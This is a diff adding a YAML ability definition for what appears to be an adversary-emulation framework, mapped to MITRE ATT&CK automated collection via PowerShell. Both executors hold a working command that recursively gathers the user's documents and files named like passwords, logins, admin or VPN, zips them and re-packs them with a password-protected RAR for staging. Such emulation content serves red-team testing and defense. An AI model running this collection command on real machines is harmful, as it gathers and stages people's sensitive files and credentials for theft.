@@ -1,0 +1,64 @@
+ability_id: 08e57385-dbce-4850-8bb7-589ef79465ab
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: Execute PowerShell collection command to collect and compress files of
+  specific extensions.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'move-item Rar.exe -Destination C:\Windows\Temp -Force;
+
+    $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk
+    -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive
+    -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip
+    -Force;
+
+    cd C:\Windows\Temp;
+
+    .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - rar.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'move-item Rar.exe -Destination C:\Windows\Temp -Force;
+
+    $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk
+    -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive
+    -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip
+    -Force;
+
+    cd C:\Windows\Temp;
+
+    .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - rar.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Automated document collection (T1119)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1059.001
+technique_name: 'Command and Scripting Interpreter: PowerShell'
